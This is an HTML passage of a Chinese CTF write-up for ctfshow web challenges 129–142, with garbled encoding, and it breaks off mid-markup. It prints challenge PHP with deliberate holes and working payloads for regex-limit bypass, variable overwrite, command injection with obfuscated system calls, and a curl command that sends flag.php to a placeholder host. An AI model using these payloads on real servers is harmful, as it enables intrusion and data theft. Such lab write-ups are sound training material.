class="code"><pre><span class="line">f=/ctfshow/../../../../../../../<span class="keyword">var</span>/www/html/flag.php</span><br></pre></td></tr></table></figure><h2 id="web130-131"><a href="#web130-131" class="headerlink" title="web130~131"></a>web130~131</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-10-13 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-13 05:19:40</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/.+?ctfshow/is&#x27;</span>, <span class="variable">$f</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(stripos(<span class="variable">$f</span>, <span class="string">&#x27;ctfshow&#x27;</span>) === <span class="literal">FALSE</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è€ƒå¯Ÿç‚¹ï¼šåˆ©ç”¨æ­£åˆ™æœ€å¤§å›æº¯æ¬¡æ•°ç»•è¿‡<br>çœ‹åˆ°æœ¬é¢˜ï¼Œè¦æƒ³åŠæ³•ç»•è¿‡preg_matchï¼ˆï¼‰æˆ–striposï¼ˆï¼‰<br>PHP ä¸ºäº†é˜²æ­¢æ­£åˆ™è¡¨è¾¾å¼çš„æ‹’ç»æœåŠ¡æ”»å‡»ï¼ˆreDOSï¼‰ï¼Œç»™ pcre è®¾å®šäº†ä¸€ä¸ªå›æº¯æ¬¡æ•°ä¸Šé™ pcre.backtrack_limit<br>å›æº¯æ¬¡æ•°ä¸Šé™é»˜è®¤æ˜¯ 100 ä¸‡ã€‚å¦‚æœå›æº¯æ¬¡æ•°è¶…è¿‡äº† 100 ä¸‡ï¼Œpreg_match å°†ä¸å†è¿”å›é 1 å’Œ 0ï¼Œè€Œæ˜¯ falseã€‚è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ç»•è¿‡ç¬¬ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼äº†ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url=<span class="string">&quot;http://03771c3c-6afb-4457-a719-19cc6ccf922e.chall.ctf.show/&quot;</span></span><br><span class="line">data=&#123;</span><br><span class="line"><span class="string">&#x27;f&#x27;</span>:<span class="string">&#x27;very&#x27;</span>*<span class="number">250000</span>+<span class="string">&#x27;ctfshow&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">r=requests.post(url,data=data)</span><br><span class="line"><span class="keyword">print</span>(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>çœ‹äº†ä¸€ä¸‹ç¾½å¸ˆå‚…çš„WPï¼ŒåŸæ¥è¿˜èƒ½æ•°ç»„ç»•è¿‡ã€‚ã€‚ã€‚æ˜¯ä¸ªéé¢„æœŸ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f[]=<span class="number">1</span></span><br></pre></td></tr></table></figure><p>striposåº”ç”¨äºæ•°ç»„çš„æ—¶å€™ä¼šè¿”å›nullï¼Œnull!==falseï¼Œæ‰€ä»¥éé¢„æœŸäº†<br>åˆçœ‹äº†ä¸€çœ¼hintï¼Œæˆ‘åˆéœ‡æƒŠäº†ï¼šf=ctfshowã€‚å‘ç”Ÿç”šä¹ˆäº‹äº†ï¼Ÿ<br>åˆæŸ¥äº†ä¸€ä¸‹ï¼ŒåŸæ¥å¯¹è¿™æ­£åˆ™è¡¨è¾¾å¼çš„ç†è§£è¿˜æ˜¯ä¸å¤ªå¯¹ï¼š/.+?ctfshow/is<br>åœ¨/sæ¨¡å¼ä¸‹ï¼Œ.åŒ¹é…ä»»æ„å­—ç¬¦ï¼Œ+è¡¨ç¤ºé‡å¤ä¸€æ¬¡æˆ–æ›´å¤šæ¬¡ï¼Œæ²¡é”™æ˜¯è‡³å°‘ä¸€æ¬¡ï¼è€Œåé¢åŠ ä¸ª?è¡¨ç¤ºæ‡’æƒ°æ¨¡å¼ï¼Œ+?è¡¨ç¤ºé‡å¤1æ¬¡æˆ–æ›´å¤šæ¬¡ï¼Œä½†å°½å¯èƒ½å°‘é‡å¤ã€‚å½“ç„¶æ‡’æƒ°æ¨¡å¼å¹¶ä¸å½±å“è§£é¢˜æ€è·¯ï¼Œæ€»ä¹‹å°±æ˜¯ctfshowå‰é¢å¿…é¡»å¾—æœ‰å­—ç¬¦æ‰èƒ½åŒ¹é…åˆ°ï¼Œæ‰€ä»¥ç›´æ¥f=ctfshowå°±å¯ä»¥äº†ã€‚</p><h2 id="web-132"><a href="#web-132" class="headerlink" title="web 132"></a>web 132</h2><p>æœ¬é¢˜é¦–å…ˆè¿›å…¥é¢˜ç›®é¡µé¢ï¼Œåœ¨</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/admin</span><br></pre></td></tr></table></figure><p>ä¹‹åçœ‹åˆ°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$code</span> === mt_rand(<span class="number">1</span>,<span class="number">0x36D</span>) &amp;&amp; <span class="variable">$password</span> === <span class="variable">$flag</span> || <span class="variable">$username</span> ===<span class="string">&quot;admin&quot;</span>)&#123;</span><br></pre></td></tr></table></figure><p>åŸç†ä¸å¤ªæ¸…æ¥šï¼Œä½†æ˜¯å¸ˆå‚…ä»¬è¯´<br>åªéœ€è®©åé¢æˆç«‹å³usernameï¼Œåˆ™</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=admin&amp;password=<span class="number">1</span>&amp;username=admin</span><br></pre></td></tr></table></figure><h2 id="web133"><a href="#web133" class="headerlink" title="web133"></a>web133</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;</span>, <span class="variable">$F</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(substr(<span class="variable">$F</span>,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;6ä¸ªå­—æ¯éƒ½è¿˜ä¸å¤Ÿå‘€?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>çœ‹å¸ˆå‚…ä»¬çš„è§£é¢˜ï¼š<br>ä¸¾ä¸ªä¾‹å­ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">getä¼ å‚   F=`<span class="variable">$F</span> `;sleep <span class="number">3</span></span><br><span class="line">ç»è¿‡substr(<span class="variable">$F</span>,<span class="number">0</span>,<span class="number">6</span>)æˆªå–å å¾—åˆ°  `<span class="variable">$F</span> `;</span><br><span class="line">ä¹Ÿå°±æ˜¯ä¼šæ‰§è¡Œ <span class="keyword">eval</span>(<span class="string">&quot;`<span class="subst">$F</span> `;&quot;</span>);</span><br><span class="line">æˆ‘ä»¬æŠŠåŸæ¥çš„<span class="variable">$F</span>å¸¦è¿›å»</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;``<span class="subst">$F</span> `;sleep 3`&quot;</span>);</span><br><span class="line">ä¹Ÿå°±æ˜¯è¯´æœ€ç»ˆä¼šæ‰§è¡Œ  `   `<span class="variable">$F</span> `;sleep <span class="number">3</span>  ` == shell_exec(<span class="string">&quot;`<span class="subst">$F</span> `;sleep 3&quot;</span>);</span><br><span class="line">å‰é¢çš„å‘½ä»¤æˆ‘ä»¬ä¸éœ€è¦ç®¡ï¼Œä½†æ˜¯åé¢çš„å‘½ä»¤æˆ‘ä»¬å¯ä»¥è‡ªç”±æ§åˆ¶ã€‚</span><br><span class="line">è¿™æ ·å°±åœ¨æœåŠ¡å™¨ä¸ŠæˆåŠŸæ‰§è¡Œäº† sleep <span class="number">3</span></span><br><span class="line">æ‰€ä»¥ æœ€åå°±æ˜¯ä¸€é“æ— å›æ˜¾çš„RCEé¢˜ç›®äº†</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ— å›æ˜¾æˆ‘ä»¬å¯ä»¥ç”¨åå¼¹shell æˆ–è€…curlå¤–å¸¦ æˆ–è€…ç›²æ³¨<br>è¿™é‡Œçš„è¯åå¼¹æ²¡æœ‰æˆåŠŸï¼Œä½†æ˜¯å¯ä»¥å¤–å¸¦ã€‚ï¼ˆç”±äºå¤–å¸¦æ²¡æœ‰æˆåŠŸï¼Œå°±ä¸¾ä¾‹ç¬¬äºŒç§åˆ©ç”¨burpsuitçš„æ–¹æ³•ï¼‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: curl -X POST -F xx=@flag.php http:<span class="comment">//xxx</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/e99f6358d5cc484f9de297a0842a3c8b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="å¾—åˆ°flag"><br>å¾—flag</p><h2 id="web134"><a href="#web134" class="headerlink" title="web134"></a>web134</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key1&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key2&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;nonononono&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@parse_str(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]);</span><br><span class="line">extract(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$key1</span> == <span class="string">&#x27;36d&#x27;</span> &amp;&amp; <span class="variable">$key2</span> == <span class="string">&#x27;36d&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(file_get_contents(<span class="string">&#x27;flag.php&#x27;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è€ƒå¯ŸPOSTå˜é‡è¦†ç›–<br>yuå¸ˆå‚…åšäº†ä¸ªæµ‹è¯•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">parse_str(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]);</span><br><span class="line">var_dump(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬ä¼ å…¥ _POST[â€˜aâ€™]=123<br>ä¼šå‘ç°è¾“å‡ºçš„ç»“æœä¸ºarray(1) { [â€œâ€˜aâ€™â€]=&gt; string(3) â€œ123â€ }<br>ä¹Ÿå°±æ˜¯è¯´ç°åœ¨çš„$_POST[â€˜aâ€™]å­˜åœ¨å¹¶ä¸”å€¼ä¸º123</p><p>é¢˜ç›®ä¸­è¿˜æœ‰ä¸ªextract($_POST)<br>è¿™æ ·çš„è¯ $a==123</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?_POST[key1]=<span class="number">36</span>d&amp;_POST[key2]=<span class="number">36</span>d</span><br></pre></td></tr></table></figure><h2 id="web135"><a href="#web135" class="headerlink" title="web135"></a>web135</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i&#x27;</span>, <span class="variable">$F</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(substr(<span class="variable">$F</span>,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;å¸ˆå‚…ä»¬å±…ç„¶ç ´è§£äº†å‰é¢çš„ï¼Œé‚£å°±æ¥ä¸€ä¸ªåŠ å¼ºç‰ˆå§&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜å’Œå‰é¢å¾—ç›¸ä¼¼ï¼Œä»–æŠŠcurlç»™è¿‡æ»¤äº†<br>çœ‹yuå¸ˆå‚…å¾—æ“ä½œï¼Œæƒ³åˆ°äº†é‡å®šå‘</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payloadï¼š?F=`<span class="variable">$F</span> `;nl f*&gt;xxx</span><br></pre></td></tr></table></figure><h2 id="web136"><a href="#web136" class="headerlink" title="web136"></a>web136</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    check(<span class="variable">$c</span>);</span><br><span class="line">    exec(<span class="variable">$c</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æœ¬é¢˜è¿‡æ»¤äº†è®¸å¤šä¸œè¥¿ï¼ŒåŒæ—¶å¦‚æœç›´æ¥lså°†ä¸ä¼šå›æ˜¾ï¼Œå› æ­¤åˆ©ç”¨linuxä¸Šçš„teeå‘½ä»¤æ¥å†™æ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=ls /|tee <span class="number">111</span></span><br></pre></td></tr></table></figure><p>ä¹‹åå‘ç°åœ¨f149_15_h3r3ä¸ªä¸‹é¢</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=cat /f149_15_h3r3|tee <span class="number">111</span></span><br></pre></td></tr></table></figure><p>å¾—flag</p><h2 id="web137"><a href="#web137" class="headerlink" title="web137"></a>web137</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-10-13 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-16 22:27:49</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;private class&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">call_user_func(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>call_user_funchanå‡½æ•°å¾—ç®€å•å›è°ƒ<br>ï¼ˆæŠŠä»–æƒ³å¤æ‚äº†ï¼Œæƒ³æˆ_walkupçš„ç»•è¿‡ï¼‰<br>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow=ctfshow::getFlag</span><br></pre></td></tr></table></figure><h2 id="web138"><a href="#web138" class="headerlink" title="web138"></a>web138</h2><p>æœ¬é¢˜å…³é”®call_user_funcï¼ˆï¼‰çš„ä½¿ç”¨<br>call_user_funcä¸­ä¸ä½†å¯ä»¥ä¼ å­—ç¬¦ä¸²ä¹Ÿå¯ä»¥ä¼ æ•°ç»„<br>ä¾‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">call_user_func(<span class="keyword">array</span>(<span class="variable">$classname</span>, <span class="string">&#x27;say_hello&#x27;</span>));</span><br><span class="line">è¿™æ—¶å€™ä¼šè°ƒç”¨ classnameä¸­çš„ say_helloæ–¹æ³•</span><br></pre></td></tr></table></figure><p>åˆ™payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow[<span class="number">0</span>]=ctfshow&amp;ctfshow[<span class="number">1</span>]=getFlag</span><br></pre></td></tr></table></figure><h2 id="web139"><a href="#web139" class="headerlink" title="web139"></a>web139</h2><p>ç›²æ³¨ï¼Œæš‚æ—¶å…ˆè¿‡</p><h2 id="web140"><a href="#web140" class="headerlink" title="web140"></a>web140</h2><p>intvalä¼šå°†éæ•°å­—å­—ç¬¦è½¬æ¢ä¸º0ï¼Œä¹Ÿå°±æ˜¯è¯´ intval(â€˜aâ€™)==0 intval(â€˜.â€™)==0 intval(â€˜/â€˜)==0<br>åˆ™å°†æœ‰å¾ˆå¤šè§£æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f1=md5&amp;f2=end</span><br></pre></td></tr></table></figure><h2 id="web141"><a href="#web141" class="headerlink" title="web141"></a>web141</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(<span class="string">&#x27;/^\W+$/&#x27;</span>, <span class="variable">$v3</span>)</span><br></pre></td></tr></table></figure><p>^æ˜¯è¡¨ç¤ºæ­£åˆ™è¡¨è¾¾å¼çš„å¼€å§‹ï¼Œ$è¡¨ç¤ºæ­£åˆ™è¡¨è¾¾å¼çš„ç»“æŸï¼Œ\wè¡¨ç¤ºä»»æ„å¤§å°å†™å­—æ¯æˆ–æ•°å­—æˆ–ä¸‹åˆ’çº¿ï¼Œ+å·è¡¨ç¤º1åˆ°å¤šä¸ª\w</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-10-13 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-17 19:28:09</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(is_numeric(<span class="variable">$v1</span>) &amp;&amp; is_numeric(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^\W+$/&#x27;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ¶ä½œå‘½ä»¤eval(â€œreturn phpinfo();â€)<br>å› æ­¤v3è‚¯å®šæ˜¯å‘½ä»¤æ‰§è¡Œï¼Œä½†æ˜¯v1v2åˆæ€ä¹ˆå¼„å‘¢ï¼ŸPHPé‡Œé¢æ•°å­—æ˜¯å¯ä»¥å’Œä¸€äº›å‘½ä»¤è¿›è¡Œè¿ç®—ï¼Œä¾‹å¦‚1-phpinfo()-1ï¼Œè¿™æ ·ä»ç„¶å¯ä»¥æ‰§è¡Œphpinfo()ï¼Œå› æ­¤æ„é€ å°±å¾ˆæ˜æ˜¾äº†ã€‚ä¸­å•çš„v3ç”¨æ— æ•°å­—å­—æ¯rceå°±å¯ä»¥ã€‚</p><blockquote><p>è¿è¡Œå–åè„šæœ¬æ„é€ system(â€˜tac f*â€™)å¾—åˆ°<br>(<del>%8C%86%8C%8B%9A%92)(</del>%8B%9E%9C%DF%99%D5);</p></blockquote><p>ï¼ˆ<a href="https://blog.csdn.net/miuzzx/article/details/109143413">yuå¸ˆå‚…å–åè„šæœ¬</a>ï¼‰ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=<span class="number">1</span>&amp;v3=-(~%<span class="number">8</span>C%<span class="number">86</span>%<span class="number">8</span>C%<span class="number">8</span>B%<span class="number">9</span>A%<span class="number">92</span>)(~%<span class="number">8</span>B%<span class="number">9</span>E%<span class="number">9</span>C%DF%<span class="number">99</span>%D5);-&amp;v2=<span class="number">1</span></span><br></pre></td></tr></table></figure><p>å¥½åƒå¼‚æˆ–å’Œæˆ–ä¸èƒ½ç”¨ï¼ˆåæ­£æˆ‘æ˜¯æ²¡æœ‰æˆåŠŸï¼‰</p><h2 id="web142"><a href="#web142" class="headerlink" title="web142"></a>web142</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 